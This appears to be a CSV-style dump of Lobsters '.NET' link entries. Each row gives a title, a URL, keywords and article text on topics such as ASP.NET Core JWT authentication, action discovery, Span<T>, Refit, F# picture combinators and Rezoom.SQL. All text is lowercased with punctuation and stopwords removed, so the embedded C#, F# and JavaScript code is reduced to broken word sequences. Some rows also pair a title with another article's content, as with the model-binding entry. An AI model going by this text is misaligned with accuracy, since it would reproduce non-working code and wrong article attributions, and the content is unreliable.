tokenvalidationparameters validateissuersigningkey true issuersigningkey new symmetricsecuritykey secret go validateissuer true validissuer name issuer validateaudience true validaudience name audience validatelifetime true validate expiration value token clockskew timespanfromminutes minute tolerance expiration date familiar aspnet core authentication middleware recommend reading external login provider aspnet core even though enabling signing google facebook etc provides detailed explanation authentication middleware work also aware new aspnet core syntax authentication fully configured via configureservices method however concept importantly example tokenvalidationparameters class class instantiate configure token validated startupcs need update configure method add authentication middleware public void configure iapplicationbuilder app ihostingenvironment env appuseauthentication need pipeline mvc appusemvc configureroutes client web api client desktop app mobile even browser example describing web application sign save token us perform authenticated request find working example first sign need send post request token wherever setup web api endpoint generate token username password easily jquery post token param username username password password done function token save token local storage localstoragesetitem token token fail handleerror go well post get jwt back save somewhere usually local storage case web application mobile depends platform using facility allow save token eg android sharedpreferences authentication middleware previous section accept jwt token transform user access controller action request must authorization header value header bearer followed jwt token example authorization bearer although manually add authorization header every request usually way automatically example jquery event use run every request check saved token case add authorization header request ajaxsetup beforesend function xhr localstoragegetitem token null xhrsetrequestheader authorization bearer localstoragegetitem token similar mechanism using framework example angular httpinterceptors finally logout need remove token local storage localstorageremoveitem token one thing aware client performs action requires user authenticated valid authorization header request server respond request response status code response also wwwauthenticate bearer header receive response like notify user authentication required related
362,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET Core 2.0: Action Discovery,http://jackhiston.com/2017/9/2/aspnet-core-20-repository-overview-action-discovery/,aspnet core action discovery,previously series aspnet core mvc repository overview model binding aspnet mvc core repository overview value provider content introduction aspnet core github repository razor page registering action iactiondescriptorcollectionprovider actiondescriptors iactiondescriptorprovider controlleractiondescriptorprovider pageactiondescriptorprovider finding controller action controlleractiondescriptorprovider actiondescriptorprovidercontext controlleractiondescriptorbuilder applicationpartmanager sharing controller assembly applicationpartmanager iapplicationfeatureprovider controller feature provider controllerfeatureprovider controllerfeature iapplicationparttypeprovider assemblypart controlleractiondescriptorprovider applicationmodel iapplicationmodelprovider default application model provider defaultapplicationmodelprovider applicationmodel nonactionattribute customising controller action discovery iapplicationfeatureprovider controllerfeature finding razor page razor page pageactiondescriptorprovider iactiondescriptorprovider iactiondescriptorcollectionprovider ipageroutemodelproviders razorprojectpageroutemodelprovider razorpageoptions withrazorpagesroot imvcbuilder withrazorpagesatcontentroot ignored ignore cshtml file page directive pageroutemodel pageroutemodelprovidercontext compiledpageroutemodelprovider cache page route model lower order property razorprojectpageroutemodelprovider razor page route template microsoft documentation pageactiondescriptor summary,previously series aspnet core mvc repository overview model binding aspnet mvc core repository overview value provider content introduction article third series dedicating reviewing code design aspnet core github repository series try explain underlying mechanism aspnet core code fit together create framework know published date aspnet core action discovery bread butter framework useful idea come framework ability find section code based metadata current http requestie action action main point within aspnet core developer interact framework article going discus framework find specific action brand new razor page fit picture nb article talk razor page work within framework version dedicate razor page topic later post registering action action provided action selection system iactiondescriptorcollectionprovider abstraction collection provider property called actiondescriptors main property provides action descriptor given system collection provider registered dependency injection system used anywhere code useful want work subset metadata found action descriptor application collection provider enumeration iactiondescriptorprovider implementation action descriptor provider something creates metadata action application provider aggregated build collection actiondescriptors property provides var actiondescriptorproviderslength actiondescriptorproviders onprovidersexecuting context two main action descriptor provider instance controlleractiondescriptorprovider pageactiondescriptorprovider one classic mvc action provider one new razor page action descriptor provider respectively mean aspnet team hooked new razor page introduced aspnet core bog standard action selection subsystem allows use classic mvc action alongside new razor page finding controller action controlleractiondescriptorprovider main class explore current application applicable controller action provider try retrieve action descriptor find adding one main actiondescriptorprovidercontext context passed collection provider foreach var descriptor getdescriptors contextresultsadd descriptor provider call build controlleractiondescriptorbuilder class passing application model protected internal ienumerable getdescriptors var applicationmodel buildmodel applicationmodelconventionsapplyconventions applicationmodel convention return controlleractiondescriptorbuilderbuild applicationmodel buildmodel method work done retrieve different controller action descriptor firstly method retrieve controller main applicationpartmanager class application part manager used add application part runtime example wanted register controller within another assembly used retrieval action descriptor following var assembly typeof controllerinassembly gettypeinfo assembly var part new assemblypart assembly service addmvc configureapplicationpartmanager apm papplicationpartsadd part also explained previous post sharing controller assembly applicationpartmanager class also contains bunch feature provider feature provider class implement iapplicationfeatureprovider one exist within core framework seen name provider specific feature mind building application model controller feature provider controllerfeatureprovider class feature interested main feature contains controller action need discover provider populate controllerfeature class class accept type given implementation iapplicationparttypeprovider class assemblypart classic example implement iapplicationparttypeprovider mean controllerfeatureprovider use provide controller type within assembly foreach var type parttypes iscontroller type featurecontrollerscontains type featurecontrollersadd type controllerfeature filled registered controller used controlleractiondescriptorprovider build eventual applicationmodel class use iapplicationmodelprovider instance application model essentially provides metadata associated controller filter list iapplicationmodelprovider instance instance registered dependency injection system used anywhere default application model provider defaultapplicationmodelprovider instance one interested action discovery provider populates controller model within main applicationmodel class use reflection enumerate method controller type given controller feature provider method within controller filtered based metadata method logic determining found main thing note use nonactionattribute stop method registered added controller model built convention applied application model allowing modify application model based convention give customising controller action discovery explained easy way extend way action discovered traditional mvc providing instance iapplicationfeatureprovider controllerfeature class public class mycontrollerfeatureprovider iapplicationfeatureprovider controllerfeature private readonly type mycustomcontrollertype public mycontrollerfeatureprovider type mycustomcontrollertype mycustomcontrollertype mycustomcontrollertype public void populatefeature ienumerable applicationpart part controllerfeature feature featurecontrollersadd mycustomcontrollertype feature provider registered application part manager startup servicesaddmvc configureapplicationpartmanager p pfeatureprovidersadd new mycontrollerfeatureprovider typeof mycustomercontroller feature provider registered used default application model provider discover action present controller finding razor page brand new razor page built way fit existing framework razor page resolve action like controller action retrieve razor page action descriptor particular application start pageactiondescriptorprovider pageactiondescriptorprovider implement iactiondescriptorprovider subsequently registered dependency injection thus hooked main iactiondescriptorcollectionprovider nb collection provider main source action descriptor application previously discussed collection provider class take registered implementation iactiondescriptorprovider build complete list action descriptor controller razor page coexist similar way controlleractiondescriptorprovider loop iapplicationmodelprovider instance pageactiondescriptorprovider class look available ipageroutemodelproviders implementation main implementation ipageroutemodelproviders instance registered dependency injection system razorprojectpageroutemodelprovider enumerate item razor page root directory option nb option setup startup configuration razorpageoptions class servicesconfigure option optionsrootdirectory customfolder default razor page found page subdirectory application snippet show customise snippet also achieved using withrazorpagesroot imvcbuilder extension method supply saying razor page rooted content root also achieved withrazorpagesatcontentroot imvcbuilder extension method razorprojectpageroutemodelprovider select file within root directory match correct predicate file starting ignoredeg layoutcshtml also ignore cshtml file page directive top file file found root directory pass inspection pageroutemodel created page added current pageroutemodelprovidercontext routemodels property pageroutemodel essentially metadata describes routing razor page compiledpageroutemodelprovider fetch compiled pageroutemodel class class also cache page route model provider lower order property razorprojectpageroutemodelprovider mean pageactiondescriptorprovider pas current context first razorprojectpageroutemodelprovider add pageroutemodel class context already exists current context mind could add brand new file root directory razor page area dynamically found provider razor page route template razor page define route template part page directive page handler handler discussed length microsoft documentation beyond scope article discus however route template provided allows specific route parameter handler parameter url path route template added pageactiondescriptor part attribute route information like traditional attribute routing classic mvc route template another example aspnet team based razor page top existing ecosystem summary throughout article discussed aspnet core discovers action within application discussed controller action discovered well new razor page discovered also pointed multiple time razor page extension action currently working within mvc world mind use mvc razor page time placed within routing model thanks reading hope help understanding aspnet core
363,Lobsters,dotnet,"C#, F#, .NET programming",Span,http://adamsitnik.com/Span/,span,content introduction corefx previous copied deallocation nondeterministic blocking demand full gc arraypool note net great gc problem asked update see supporting kind memory previously hard problematic span solution previously value type ensures memory type safety prerequisite systemmemory note using span api simplicity simple get span abstract almost everything memory make using unmanaged memory much easier apis producer consumer work corefx implement byreference performance slicing without managed heap allocation benchmarkdotnet slicing allocate managed heap memory slicing constant cost slow v fast span note span v array requirement limitation struct tearing stackonly heap span must field nonstackonly type c span must implement existing interface previous span must parameter async method heap span must generic type argument memory summary source,tl dr use span work kind memory safe efficient way simplify apis use full power unmanaged memory content introduction c give u great flexibility come using different kind memory majority developer use managed one let take brief look c offer u stack memory allocated stack stackalloc keyword fast allocation deallocation size stack small usually mb fit well cpu cache try allocate get stackoverflowexception handled immediately kill entire process usage also limited short lifetime stack method end stack get unwinded together memory stackalloc commonly used short operation must allocate managed memory example fast logging etw event corefx fast possible need little memory size limitation problem internal unsafe void bufferrented int bufferid int buffersize int poolid int bucketid eventdata payload stackalloc eventdata payload size sizeof int payload datapointer intptr bufferid payload size sizeof int payload datapointer intptr buffersize payload size sizeof int payload datapointer intptr poolid payload size sizeof int payload datapointer intptr bucketid writeeventcore payload unmanaged memory allocated unmanaged heap invisible gc calling marshalallochglobal marshalalloccotaskmem method memory must released developer explicit call marshalfreehglobal marshalfreecotaskmem using add extra pressure gc commonly used avoid gc scenario would normally allocate huge array value type without pointer see reallife use case kestrel managed memory allocate new operator called managed managed garbage collector gc gc decides free memory developer need worry described one previous blog post gc divide managed object two category small object size byte allocated generational part managed heap allocation small object fast promoted older generation memory usually copied deallocation nondeterministic blocking shortlived object cleaned fast gen gen collection long living one subject gen collection usually timeconsuming large object size byte allocated large object heap loh managed free list algorithm offer slower allocation lead memory fragmentation advantage large object default never copied behavior changed demand loh expensive deallocation full gc minimized using arraypool note say given gc operation slow mean net gc slow net great gc gc better gc problem last time seen public net api accepting pointer recent ndc oslo talk asked audience ever used stackalloc one person kristian one hundred raised hand uncommon use native memory c let try answer question designing api parsing integer kind memory start string managed representation buffer character int parse string managedmemory allows u parse whole string want parse selected part string int parse string managedmemory int startindex int length allows u parse part string ok let support unmanaged memory unsafe int parse char pointertounmanagedmemory int length allows u parse character stored unmanaged heap stack unsafe int parse char pointertounmanagedmemory int startindex int length allows u parse part character stored unmanaged heap stack already four overload pretty sure missed something let design api copying block memory void copy source destination void copy source int sourcestartindex destination int destinationstartindex int elementscount unsafe void copy void source void destination int elementscount unsafe void copy void source int sourcestartindex void destination int destinationstartindex int elementscount unsafe void copy void source int sourcelength destination unsafe void copy void source int sourcestartindex destination int destinationstartindex int elementscount update need worry handling long parameter array net method getlonglength never return value bigger intmax see supporting kind memory previously hard problematic span solution span previously called slice simple value type allows u work kind contiguous memory unmanaged memory buffer array subarrays string substring ensures memory type safety almost overhead prerequisite work span need install latest systemmemory nuget package set langversion c newer propertygroup langversion langversion propertygroup note older compiler might give error like error feature ref structs available c please use language version greater using span would say think like array pointer arithmetic internally point kind memory create span unmanaged memory span byte stackmemory stackalloc byte c intptr unmanagedhandle marshalallochglobal span byte unmanaged new span byte unmanagedhandletopointer marshalfreehglobal unmanagedhandle even implicit cast operator span char array new char p l c span char fromarray array implicit cast also readonlyspan used work string immutable type readonlyspan char fromstring string net immutable asspan create use way would typically use array length property indexer allows get set value simplified api full found span array span array int startindex span array int startindex int length unsafe span void memory int length int length get ref int index get set span slice int start span slice int start int length void clear void fill value void copyto span destination bool trycopyto span destination api simplicity let redesign parsing copying apis mentioned earlier take advantage span int parse readonlyspan char anymemory int copy readonlyspan source span destination simple get span abstract almost everything memory make using unmanaged memory much easier apis producer consumer work two version span runtimes existing prior span new runtimes implement native support span version existing runtimes implemented corefx net core far runtime implement native support span span existing runtimes consists three field reference represented simple reference type field byteoffset intptr length int long access nth value indexer pointer arithmetic u pseudocode ref int index get ref ref reference byteoffset index sizeof new gc know deal span reference byteoffset field got merged interior pointer new gc aware fact merged reference native support updating reference needed compact phase garbage collection underlying object like array moved reference need updated offset need remain untouched il c support ref field net core implement representing via byreference type jit intrinsic performance slicing without managed heap allocation slicing taking part memory core feature span copy memory simply creates span different pointer length offset old runtimes important far net anytime wanted substring string net allocating new string u copying desired content pseudocode string substring string text int startindex int length string result new string length allocation memorycopy source text destinaiton result startindex length copying memory return result span allocation pseudocode readonlyspan char slice string text int startindex int length new readonlyspan char ref text startindex sizeof char length let measure difference benchmarkdotnet memorydiagnoser config typeof dontforcegccollectionsconfig public class substringvssubslice private string text params public int characterscount get set globalsetup public void setup text new string enumerablerepeat characterscount toarray benchmark public string substring textsubstring textlength benchmark baseline true public readonlyspan char slice textasspan slice textlength oswindows redstone processorintel core cpu skylake hz n timertsc host clr jobnjyluu clr forcefalse clear slicing allocate managed heap memory substring allocates allocated column slicing much faster mean column slicing constant cost look value standard deviation mean characterscount slow v fast span people call span slow span fast span benchmarkdotnet allows running benchmark multiple runtimes let use compare indexer net net core net core config typeof multipleruntimesconfig public class spanindexer protected const int loop protected const int count protected byte arrayfield globalsetup public void setup arrayfield enumerablerepeat count select val index byte index toarray benchmark operationsperinvoke loop count public byte spanindexerget span byte local arrayfield implicit cast span ca nt span field byte result int loop int j j locallength j result local j return result benchmark operationsperinvoke loop count public void spanindexerset span byte local arrayfield implicit cast span ca nt span field int loop int j j locallength j local j bytemaxvalue public class multipleruntimesconfig manualconfig public multipleruntimesconfig add jobdefault span supported runtime withid net add jobdefault span supported runtime withid net core add jobdefault span supported runtime withid net core oswindows redstone processorintel core cpu skylake hz n timertsc host clr net clr net core net core ryujit net core net core ryujit difference around opinion prof people afraid using slow span existing runtimes place improvement new runtimes gap might get bigger soon note please keep mind benchmark perfect indexer benchmark relies heavily cpu cache sure even possible design perfect benchmark indexer span v array take look official requirement span find performance characteristic par array let measure public class spanvsarrayindexer spanindexer benchmark operationsperinvoke loop count public byte arrayindexerget var local arrayfield byte result int loop int j j locallength j result local j return result benchmark operationsperinvoke loop count public void arrayindexerset var local arrayfield int loop int j j locallength j local j bytemaxvalue oswindows redstone processorintel core cpu skylake hz n timertsc host clr net clr net core net core ryujit net core net core ryujit requirement met new runtime native span support net core personally believe possible existing runtimes meet requirement way add feature like array bound check elimination existing runtimes limitation span support kind memory mean restriction demanding type memory case stack memory pointer stack must stored managed heap method end stack get unwinded pointer becomes invalid somehow store heap bad thing going happen anything else contains pointer stack also must stored managed heap mean span must stored managed heap moreover span value type one field suffers struct tearing span supposed fast solve struct tearing issue introducing access synchronization stackonly span stackonly type span instance reside stack stack shared across multiple thread single stack accessed one thread time ensures thread safety span stack shortlived mean gc track fewer pointer would let live long heap could get situation span creates big overhead gc heap fact span stackonly type must stored heap lead u long list limitation span must field nonstackonly type make span field class stored heap prohibited class impossible span byte field since c possible span field stackonly type ref struct twospans reflike instance field public span first public span second span must implement existing interface let consider following c il code void nonconstrained ienumerable collection struct somevaluetype ienumerable void demo var value new somevaluetype int nonconstrained value value got boxed mean stored heap prohibited span read boxing previous blog post point prevent boxing span must implement existing interface like ienumerable future c allows defining interface implemented struct might become possible span must parameter async method async await awesome c feature make life easier solving lot problem hiding lot complexity u whenever async await used asyncmethodbuilder created builder creates asynchronous state machine point time might put parameter method heap span must argument async method span must generic type argument let consider following c code span byte allocate new span byte new byte void callandprint func valueprovider generic requirement object value valueproviderinvoke boxing consolewriteline valuetostring void demo func span byte spanprovider allocate callandprint span byte spanprovider see nonboxing requirement ensured today allow span generic type argument one possible solution could introduce new generic constraint stackonly managed compiler would respect ensure lack boxing restriction decided simply forbid using span generic argument initially requirement verified runtime net core since c also enforced compiler compile time memory memory new type point managed memory stackonly limitation created managed array string iownedmemory passed async method stored field class need span call span property creates span demand use within current scope public readonly struct memory private readonly object object string array ownedmemory private readonly int index private readonly int length public span span get public memory slice int start public memory slice int start int length public memoryhandle pin sample usage byte buffer arraypool byte sharedrent use array span bytesread await filestreamreadasync buffer bufferlength await writing array parseblock new readonlymemory byte buffer start length bytesread creating readonlymemory point managed array void parseblock readonlymemory byte memory readonlyspan byte slice memoryspan using span summary allows work type memory systemmemory package c make working native memory much easier simple abstraction pointer arithmetic avoid allocation copying memory slicing support net standard performance par array new runtimes limited due stack requirement source
364,Lobsters,dotnet,"C#, F#, .NET programming",A type-safe REST,http://www.jackhiston.com/2017/8/28/a-type-safe-rest/,typesafe rest,httpclient refit refit paul betts retrofit food standard agency httpclient example newtonsoftjson refit example summary,current age microservices communication different process across wide variety host platform time integrate party library downloading information metadata may necessary current application occasion need interact rest api nice interacting rest apis could allow compiler help u could create type safe way interacting rest api away httpclient unopinionated abstraction refit automatic typesafe rest library net core xamarin net u refit refit essentially wrapper us httpclient turn api opinionated api written paul betts api fit exactly need heavily inspired retrofit similar idea android java let take example uk food standard agency lot open public apis consumption one api uk food hygiene rating data api api allows query local authority within area acceptance rating httpclient example typical call rest api would var client new httpclient clientbaseaddress new uri http apiratingsfoodgovuk clientdefaultrequestheadersacceptclear clientdefaultrequestheadersacceptadd new mediatypewithqualityheadervalue applicationjson clientdefaultrequestheadersadd xapiversion var response await clientgetasync authority could deserialise something like following public class link public string rel get set public string href get set represents local authority within government food rating api public class localauthority public int localauthorityid get set public string localauthorityidcode get set public string name get set public string friendlyname get set public string url get set public string schemeurl get set public string email get set public string regionname get set public string filename get set public string filenamewelsh get set public int establishmentcount get set public string creationdate get set public string lastpublisheddate get set public int schemetype get set public list link link get set public class localauthoritiesresult public list localauthority authority get set public meta meta get set public list link link get set could achieved using newtonsoftjson responseissuccessstatuscode var data await responsecontentreadasstringasync stringisnullorwhitespace data result await taskrun jsonconvertdeserializeobject localauthoritiesresult data reading content response string using jsonconvert class deserialise string data poco class localauthoritiesresult refit example main problem previous code actual request string hard coded http method interaction api also signified method call refit make much simpler straightforward give api read well hiding detail actually interacting public interface ifoodstandardsapi header xapiversion accept applicationjson get authority task localauthoritiesresult getlocalauthorities example turned api type safe version use api would following ifoodstandardsapi foodstandardsapi restservicefor ifoodstandardsapi http apiratingsfoodgovuk localauthoritiesresult localauthorities await foodstandardsapigetlocalauthorities summary refit fantastic tool allow create interface apis consume runtime new idea thing retrofit around time think simplicity quick setup refit along type safe approach go tool anything concerning rest apis hope help
365,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET MVC Core – Repository Overview: Value Providers,http://jackhiston.com/2017/8/25/aspnet-mvc-core-repository-overview-value-providers,aspnet mvc core repository overview value provider,github documentation microsoft fantastic aspnet core mvc repository github model binding razor engine filter data annotation repository structure aspnet team design pattern aspnet model binding frombodyattribute mvccoreservicecollectionextensions defaultapplicationmodelprovider controlleractiondescriptorprovider frombodyattribute imodelbinderprovider mvcoptions mvccoremvcoptionssetup modelbinderfactory parameterbinder summary,think best way learn code read code think number one tool aspiring developer github found aspnet core team microsoft going open source platform ecstatic open source movement would chance learn technique used microsoft provide wonderful framework work think understanding aspnet core mvc would half without reading code actually run documentation microsoft fantastic able read bare bone software true mentor said reading code thought would great idea create post around architecture coming week first installment blog post provide general overview aspnet core mvc repository github go folder structure project structure general pattern employed team also touch first topic feel one core feature framework model binding going go value provider hopefully future plan release blog post slowly digest everything hopefully able show design concept popular feature razor engine filter data annotation time justice repository structure main body work structured similar way repository aspnet team usually start src folder test folder shown turn chance korebuild system seem necessitate highlevel folder structure src test build post go korebuild become obsolete favour using aspnet team internal build tool repositorynb seem follow similar way functioning would like learn code available top level src folder see functionality mvc provides box glance microsoftaspnetcoremvc project tie mvc project together main service collection extension live adding mvc dependency injection engine microsoftaspnetcorecore like name suggests core entire mvc architecture thing like controllerbase defined application model many definition action result lot formatters model binding provider many project specific feature thing razor new razor page tag helper cors design pattern aspnet mvc github repository us variety software design pattern context throughout entire repository mvc exists multitude class suffix context context pattern designed allow storage data andor metadata area functionality use together order provide situational result context pattern main way extend framework along provider pattern framework create context contexteg httpcontext make behavioural decision based metadata provided adapter adapter pattern allows existing functionality plugged new way working classic example adapter pattern work mvc validationattributeadapter instance implement iclientmodelvalidator used provide compatibility client model validation data attribute system aspnet model binding model binding achieved multiple way one way use attribute example use frombodyattribute declare action parameter populated body http requesteg form post following diagram show repository structure utilises attribute provider shown diagram registered dependency injection system within mvccoreservicecollectionextensions defaultapplicationmodelprovider class given context full controller type provided controller type generally provided application part manager controlleractiondescriptorprovider us controller type looped action method found reflection analysed try find binding attribute findeg frombodyattribute provider pattern allows user framework extend framework functionality usually given context create custom provider range extending functionality value provider model binder provider example imodelbinderprovider interface allows extend functionality default model binding engine binder provider registered global mvcoptions default binder setup default mvccoremvcoptionssetup class imodelbinderprovider used modelbinderfactory factory used parameterbinder class used bind value provider model diagram show action aspneaspnet core mvc model binder provider jackhistoncomimagesaspnetrepooverviewaspnetmvcrepoarchmodelbinderproviderssvg aspnet core mvc model binder provider step parameterbinder class used general idea core model binding work use global mvcoptions class key consumer framework add many custom model binder provider want list registered model binder provider return valid result used produce binding result summary generalised aspnet core mvc repository architecture discussed biggest design pattern used achieve flexibility general area might found also gone lowlevel code work come model binding part series post dedicate repository next post go describe another main feature repository
366,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET Core MVC – Repository Overview: Model Binding - Jack Histon's Blog,http://jackhiston.com/2017/8/21/aspnet-core-mvc-repository-overview-model-binding,aspnet core mvc repository overview model binding jack histon blog,create bogus data c,create bogus data c published october min read programmer lazy love tool automate life automate data timeconsuming necessary part programmer job seeding data database demonstration load performance styling testing need way generate data rudimentary way hand spending day sometimes week inputting data system represents realistic golive scenario begin realise hand inefficient decide create seeding application
367,Lobsters,dotnet,"C#, F#, .NET programming",Picture combinators and recursive fish,https://einarwh.wordpress.com/2017/07/22/picture-combinators-and-recursive-fish/,picture combinators recursive fish,picture combinators recursive fish einar uncategorized lambda day check lecture online b c b c x f mapper map b x c vector ngraphics mapshape rendersvg turn turn flip toss toss beside beside turn flip toss ttile toss u nonet nonet nonet nonet u side corner turn side corner nonet quartet blank side corner side quartet blank u u nonet lens rehue rehue rehue u rehue squarelimit like,picture combinators recursive fish posted july author einar filed uncategorized february sitting auditorium krakow listening mary sheeran john hughes give opening keynote lambda day conference inspired inspiring keynote discussed influential idea interesting paper written functional programming absolutely check one paper mentioned functional geometry peter henderson written henderson show deconstruction escher woodcut called square limit elegantly reconstruct replica woodcut using function data defines small set picture combinators simple function operate picture function form complex picture simple one escher original woodcut look like pretty much recursive dream wonder henderson found fascinating functional programmer would listening keynote recalled heard paper legendary sicp lecture abelson sussman lecture case interested figured time read paper first hand rather read revised version found online course one thing led another pretty soon implemented version f sort feel free tag along walk implemented key point paper distinguish capability rendering shape within bounding box onto screen one hand transformation composition picture complex picture essence decoupling abstraction basic building block picture think picture collection colored pixel rather something capable scaling fitting respect bounding box word type picture box shape list picture function take box creates list shape rendering box define using three vector b c type vector x float float type box vector b vector c vector vector denotes offset origin bottom left corner box vector b c span bounding box vector defined magnitude x dimension example assume picture f produce letter f given bounding box rendering might look like give f different box rendering look different create render magical selffitting picture decompose problem three part defining basic shape transforming shape respect bounding box rendering final shape start defining basic shape relative unit square unit square side length position bottom left corner top right corner definition put polygon outlining f picture inside unit square let fshape let pt x x x x x x x x x x polygon point pt make basic shape fit bounding box need mapping function easy enough obtain let mapper b b c c x x b x c mapper function take bounding box vector produce new vector adjusted fit box use partial application create suitable map function particular box see little bit vector arithmetic produce new vector adding three vector vector obtained scaling b x vector obtained scaling c proceed need additional operation well implement overloading operator vector type static member x x x static member x x x x static member static member f x x x f x f static member v f f v static member v f v f give u addition negation subtraction scalar multiplication scalar division vector finally need render shape way largely implementation detail take look one possible simplified rendering code used produce svg image polygon shape using ngraphics library type polygonshape point vector list type shape polygon polygonshape let mapshape function polygon point pt polygon point pt listmap let createpicture shape fun box shape listmap mapshape mapper box let rendersvg width height filename shape let size size width height let canvas graphiccanvas size let p x point x height let drawshape function polygon point pt match pt listmap fun x x p x startpoint let move moveto startpoint pathop let line listmap fun pt lineto pt pathop let close closepath pathop let ops move line close canvasdrawpath ops pensblack shape listiter drawshape use writer new streamwriter filename canvasgraphicwritesvg writer create picture use mapshape function apply mapping function point polygon make f rendersvg used actual rendering shape produced picture function picture abstraction place proceed define combinators transform compose picture neat thing define combinators without worry rendering shape word never pry open abstraction trust right thing work relative respect bounding box start basic onetoone transformation function type type transformation picture picture first transformation turn rotates picture degree counterclockwise around center around center bounding box effect turn look like note turning four time produce original picture formulate property turn turn turn turn p p course picture symmetry turning twice even might enough yield picture equal original property hold picture vector arithmetic turn bounding box degree counterclockwise follows b c b c b reiterate neat thing need consider define transformation using nothing simple arithmetic trust picture cope everything else code write let turnbox b b c c b b c c b let turn p turnbox p overloaded operator defined make easy translate vector arithmetic code also make code easy read hopefully convince right thing next transformation flip flip picture center vertical axis bounding box might sound bit involved flipping twice always produce picture following property hold flip flip p p vector arithmetic follows b c b b c translates neatly let flipbox b b c c b b b c c let flip p flipbox p third transformation bit peculiar quite particular task mimicking escher square limit building henderson called transformation refer toss since think resembles lightheartedly tossing picture air going degree counterclockwise rotation around top left corner also shrink bounding box factor easy define simple property hold toss instance tossing twice turning even try vector arithmetic still pretty simple b c b c b c c b still translates directly code let tossbox b b c c let b c let b b c let c c b b b c c let toss p tossbox p transformation use course combine transformation eg turn turn flip toss produce proceed compose simple picture complex one define two basic function composing picture beside two quite similar function take two picture argument place first picture second whereas beside place first picture left second see f placed turned f f placed beside turned f notice composed picture form square whereas original picture placed within half square happens bounding box given composite picture split two original picture receiving one split box bounding box example show even split general assign fraction bounding box first argument picture remainder second implementation detail look let splithorizontally f box let top box movevertically f scalevertically f let bottom box scalevertically f top bottom let aboveratio n fun box let f float float n let splithorizontally f box let aboveratio three thing need work fraction bounding box assigned first picture split bounding box two according fraction pas appropriate bounding box picture split bounding box creating two new bounding box scaled moved appropriate mechanic scaling moving implemented follows let scalevertically b b c c b b c c let movevertically offset b b c c c offset b b c c create interesting image one made like beside turn turn flip p turn turn p beside flip p p basic toolset complete time lose support wheel turn attention original task creating replica henderson replica escher square limit start basic picture somewhat interesting f using far according paper henderson created fish bezier curve attempt recreating notice fish violates boundary unit square point shape coordinate zero one fine picture really bound box scaled positioned relative course turn flip toss fish like fish might immediately obvious fish escher fish interesting property fish shown overlay turned twice define combinator take two picture place picture respect bounding box voila see fish designed fit together neatly stop show tile one building block use construct square limit function ttile creates tile given picture let ttile f let fishn f toss flip let fishe fishn turn turn turn f fishn fishe see needed toss transformation defined earlier begin appreciate ingenious design fish second building block need called tile u look like construct like let utile f picture let fishn f toss flip let fishw fishn turn let fish fishw turn let fishe fish turn fishn fishw fishe fish compose square limit observe construct nine tile organized grid define helper function nonet take nine picture argument lay top bottom left right calling nonet picture letter h e n e r n produce result code nonet look like let nonet p q r u v w x aboveratio besideratio p beside q r besideratio beside u besideratio v beside w x need figure appropriate picture pas nonet produce square limit replica center tile easiest simply tile u already constructed addition need side tile corner tile used four time turn transformation applied time side corner selfsimilar recursive nature think tile consisting nested grid similarly nonet define function quartet construct grid four picture let quartet p q r beside p q beside r use fill quartet well first need base case terminate recursion help u use degenerate picture blank produce nothing given bounding box discus side first since simplest two also corner us side base case look like recursive case want selfsimilar copy sidetile top row instead blank picture case one step removed base case look like following code help u construct side arbitrary depth let rec side n p let n blank else side n p let ttile p quartet turn give u side tile used north tile nonet function obtain west south east well turning around twice thrice creating corner quite similar creating side base case quartet consisting three blank picture u tile final bottom right picture look like recursive case use selfsimilar copy corner tile top left northwest picture side tile top right bottom left picture keeping u tile bottom right tile write code let rec corner n p let c n blank blank else corner n p side n p let u utile p quartet c turn u give u top left corner nonet function course produce remaining corner turning number time putting everything together let squarelimit n picture let cornernw corner n picture let cornersw turn cornernw let cornerse turn cornersw let cornerne turn cornerse let siden side n picture let sidew turn siden let side turn sidew let sidee turn side let center utile picture nonet cornernw siden cornerne sidew center sidee cornersw side cornerse calling squarelimit fish produce following image pretty good replica henderson replica escher square limit depth sweet misson accomplished done sort suppose mean could however take look directly escher woodcut likely photo find online notice couple thing henderson basic fish look bit different escher basic fish escher basic fish come three hue white grey black whereas henderson white one would nice address issue came support different hue fish requires bit thinking follow henderson instruction use exactly approach addition transforming shape picture need able transform coloring picture introduce new abstraction call lens type hue blackish greyish whiteish type lens box hue redefine picture accept lens instead box way picture take hue coloring account figuring draw define new combinator rehue change hue given picture let rehue p let change function blackish greyish greyish whiteish whiteish blackish fun box hue p box change hue changing hue three time take u back original hue rehue rehue rehue p p need revise tile used construct square limit incorporate rehue combinator turn need create two variant tile course old tile appropriate call rehue fish let ttile huen huee f let fishn f toss flip let fishe fishn turn turn turn f fishn huen fishe huee let ttile rehue rehue rehue let ttile rehue rehue rehue u tile need three variant call rehue varying degree fish let utile huen huew hue huee f let fishn f toss flip let fishw fishn turn let fish fishw turn let fishe fish turn fishn huen fishw huew fishe huee fish hue let utile rehue rehue id rehue rehue id let utile id rehue rehue rehue rehue rehue let utile rehue rehue id rehue id use two variant tile two side function one north south side another west east side let side tt huesw huese n p let rec aux n p let tt p let r n blank else aux n p quartet r r turn huesw huese aux n p let side id rehue let side rehue rehue rehue define two corner function well one northwest southeast corner another northeast southwest corner let corner ut sidene sidesw n p let rec aux n p let c ne sw n blank blank blank else aux n p sidene n p sidesw n p let u ut p quartet c ne sw turn u aux n p let corner let corner write updated squarelimit us new tile function let squarelimit n picture let cornernw n picture let cornersw n picture turn let cornerse cornernw turn turn let cornerne cornersw turn turn let siden n picture let sidew n picture turn let side siden turn turn let sidee sidew turn turn let center picture nonet cornernw siden cornerne sidew center sidee cornersw side cornerse calling squarelimit fish produce following image pretty good replica escher square limit depth complete code update also written version using fable safe use presentation find like like loading related
368,Lobsters,dotnet,"C#, F#, .NET programming",Rezoom.SQL: an F# ORM for statically typed SQL queries,https://github.com/rspeele/Rezoom.SQL,rezoomsql f orm statically typed sql query,tutorial full documentation query playground try sql dialect live statically typed sql f database schema inferred migration script query playground productivity static typing mistyped table name incompatible data type selecting column included clause flexible migration order working team one true migration order integration rezoom rezoom automatic batching automatic caching get started tutorial,tutorial full documentation query playground try sql dialect live statically typed sql f rezoomsql f orm sql database integrates f compiler via generative type provider statically typecheck dialect sql know translate sql dialect various backends currently support sqlite sql server postgresql type provider make fast easy write sql statement run consume result f code full type safety nt need install editor extension custom tooling add nuget package running writing code like database schema inferred migration script order typecheck query rezoomsql know database schema know example id column user table int learns schema reading migration script observing table view created column added developing first iteration application new feature migration script easy sketch model go back change code without touch real database ready run example might want refresh page start gif beginning generative type provider make plain old net type use language write f project us rezoomsql defines migration query reference c vbnet project use generated query type problem langages even option represent nullable type c style systemnullable instead 